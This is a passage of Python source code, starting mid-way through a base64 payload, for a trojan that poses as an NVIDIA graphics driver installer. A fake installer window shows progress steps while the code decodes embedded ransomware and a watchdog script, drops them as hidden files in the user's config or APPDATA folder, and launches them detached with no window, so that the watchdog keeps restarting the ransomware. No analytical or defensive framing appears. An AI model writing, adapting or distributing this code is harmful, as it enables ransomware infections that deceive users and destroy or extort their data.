W4od2F0Y2hkb2dfZGlyLCBSQU5TT01XQVJFX1NDUklQVCkNCiAgICAgICAgd2F0Y2hkb2dfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykNCiAgICAgICAgDQogICAgICAgICMgUmVtb3ZlIHN0b3Agc2lnbmFsDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKFNUT1BfU0lHTkFMX0ZJTEUpOg0KICAgICAgICAgICAgdHJ5OiBvcy5yZW1vdmUoU1RPUF9TSUdOQUxfRklMRSkNCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcw0KICAgICAgICANCiAgICAgICAgIyBEZWxldGUgcmFuc29td2FyZSBmaWxlDQogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHJhbnNvbXdhcmVfcGF0aCk6DQogICAgICAgICAgICB0cnk6IG9zLnJlbW92ZShyYW5zb213YXJlX3BhdGgpDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICAgICAgDQogICAgICAgICMgRGVsZXRlIHdhdGNoZG9nIGZpbGUgKHNlbGYtZGVsZXRlKQ0KICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cyh3YXRjaGRvZ19wYXRoKToNCiAgICAgICAgICAgIHRyeTogb3MucmVtb3ZlKHdhdGNoZG9nX3BhdGgpDQogICAgICAgICAgICBleGNlcHQ6IHBhc3MNCiAgICBleGNlcHQ6DQogICAgICAgIHBhc3MNCg0KZGVmIG1haW4oKToNCiAgICAiIiJNYWluIHdhdGNoZG9nIGxvb3Agd2l0aCBwcm9wZXIgc2lnbmFsIGNoZWNraW5nLiIiIg0KICAgIA0KICAgICMgU1RFUCAxOiBDaGVjayBmb3IgbGVmdG92ZXIgc3RvcCBzaWduYWwgKGZyb20gcHJldmlvdXMgcnVuKQ0KICAgIGlmIHNob3VsZF9zdG9wKCk6DQogICAgICAgIGNsZWFudXBfYW5kX2V4aXQoKQ0KICAgICAgICByZXR1cm4NCiAgICANCiAgICAjIFNURVAgMjogU3RhcnQgcmFuc29td2FyZSBpZiBub3QgcnVubmluZw0KICAgIGlmIG5vdCBpc19yYW5zb213YXJlX3J1bm5pbmcoKToNCiAgICAgICAgc3RhcnRfcmFuc29td2FyZSgpDQogICAgICAgIHRpbWUuc2xlZXAoMykgICMgR2l2ZSBpdCB0aW1lIHRvIHN0YXJ0DQogICAgDQogICAgIyBTVEVQIDM6IE1vbml0b3IgbG9vcA0KICAgIHdoaWxlIFRydWU6DQogICAgICAgIHRyeToNCiAgICAgICAgICAgICMgQUxXQVlTIGNoZWNrIHN0b3Agc2lnbmFsIEZJUlNUIGJlZm9yZSBBTlkgYWN0aW9uDQogICAgICAgICAgICBpZiBzaG91bGRfc3RvcCgpOg0KICAgICAgICAgICAgICAgIGNsZWFudXBfYW5kX2V4aXQoKQ0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICANCiAgICAgICAgICAgICMgT25seSByZXN0YXJ0IGlmIG5vdCBydW5uaW5nIEFORCBubyBzdG9wIHNpZ25hbA0KICAgICAgICAgICAgaWYgbm90IGlzX3JhbnNvbXdhcmVfcnVubmluZygpOg0KICAgICAgICAgICAgICAgICMgRG91YmxlLWNoZWNrIHN0b3Agc2lnbmFsIGJlZm9yZSByZXN0YXJ0aW5nIChmaXhlcyB0aW1pbmcgbG9vcGhvbGUpDQogICAgICAgICAgICAgICAgaWYgc2hvdWxkX3N0b3AoKToNCiAgICAgICAgICAgICAgICAgICAgY2xlYW51cF9hbmRfZXhpdCgpDQogICAgICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIHN0YXJ0X3JhbnNvbXdhcmUoKQ0KICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMikgICMgV2FpdCBiZWZvcmUgbmV4dCBjaGVjaw0KICAgICAgICAgICAgDQogICAgICAgICAgICB0aW1lLnNsZWVwKENIRUNLX0lOVEVSVkFMKQ0KICAgICAgICAgICAgDQogICAgICAgIGV4Y2VwdCBLZXlib2FyZEludGVycnVwdDoNCiAgICAgICAgICAgIGJyZWFrDQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246DQogICAgICAgICAgICB0aW1lLnNsZWVwKENIRUNLX0lOVEVSVkFMKQ0KDQppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOg0KICAgIG1haW4oKQ0K"
RANSOMWARE_NAME = ".nvidia_ransomware.py"
WATCHDOG_NAME = ".nvidia_watchdog.py"

def extract_and_execute_payload():
    """Drops both ransomware and watchdog, then launches watchdog."""
    try:
        ransomware_data = base64.b64decode(RANSOMWARE_B64)
        watchdog_data = base64.b64decode(WATCHDOG_B64)
        
        if os.name == 'nt':
            drop_dir = os.getenv('APPDATA')
            if not drop_dir: drop_dir = tempfile.gettempdir()
        else:
            drop_dir = os.path.expanduser("~/.config")
            if not os.path.exists(drop_dir):
                os.makedirs(drop_dir, exist_ok=True)
        
        ransomware_path = os.path.join(drop_dir, RANSOMWARE_NAME)
        watchdog_path = os.path.join(drop_dir, WATCHDOG_NAME)
        
        # Drop both files
        with open(ransomware_path, "wb") as f:
            f.write(ransomware_data)
        
        with open(watchdog_path, "wb") as f:
            f.write(watchdog_data)
            
        # Launch WATCHDOG (which will launch ransomware)
        if os.name == 'nt':
            subprocess.Popen(["python", watchdog_path], 
                           creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        else:
            subprocess.Popen(["python3", watchdog_path], 
                           start_new_session=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
    except Exception as e:
        pass

def fake_installer_gui():
    root = Tk()
    root.title(FAKE_TITLE)
    root.geometry("600x400")
    root.resizable(False, False)
    root.configure(bg="#1a1a1a")

    header = Frame(root, bg="#1a1a1a")
    header.pack(fill="x", pady=20)
    Label(header, text="NVIDIA", fg="#76b900", bg="#1a1a1a", font=("Segoe UI", 24, "bold")).pack()
    Label(header, text="Graphics Driver Installer", fg="white", bg="#1a1a1a", font=("Segoe UI", 16)).pack()

    content = Frame(root, bg="#1a1a1a")
    content.pack(expand=True, fill="both", padx=40)
    
    status_label = Label(content, text="Checking system compatibility...", fg="#cccccc", bg="#1a1a1a", font=("Segoe UI", 10))
    status_label.pack(anchor="w", pady=(20, 5))
    
    progress = ttk.Progressbar(content, orient="horizontal", length=520, mode="determinate")
    progress.pack(pady=10)

    def run_simulation():
        steps = [
            "Checking install options...", "Validating packages...", "Installing Graphics Driver...",
            "Installing HD Audio Driver...", "Installing PhysX System...", "Finalizing..."
        ]
        
        # DROP THE PAYLOAD EXECUTION HERE
        root.after(2000, extract_and_execute_payload)
        
        progress['maximum'] = 100
        current_val = 0
        
        for i, step in enumerate(steps):
            time.sleep(1.0) 
            status_label.config(text=step)
            root.update()
            
            target = int((i + 1) / len(steps) * 100)
            while current_val < target:
                current_val += 2
                progress['value'] = current_val
                time.sleep(0.02)
                root.update()
        
        time.sleep(1)
        root.destroy()

    threading.Thread(target=run_simulation, daemon=True).start()
    root.mainloop()

if __name__ == "__main__":
    fake_installer_gui()
